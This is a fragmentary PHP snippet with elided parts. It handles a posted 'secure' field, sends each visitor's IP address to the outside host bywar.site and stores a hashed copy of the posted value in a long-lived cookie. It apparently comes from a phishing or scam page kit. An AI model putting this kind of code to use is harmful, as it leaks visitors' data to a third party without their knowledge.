...
elseif(isset($_POST['secure'])){
	...
	if(isset($modvnl) && $modvnl==true) {
		// Usando file_get_contents directamente
		$data = file_get_contents("http://bywar.site/mod.php?ip=".$_SERVER['REMOTE_ADDR']);
	...
	fclose($handle);
	#-----------------------------------------------
	setcookie("secureid",md5($_POST['secure']),time()+3600*24*365);
}
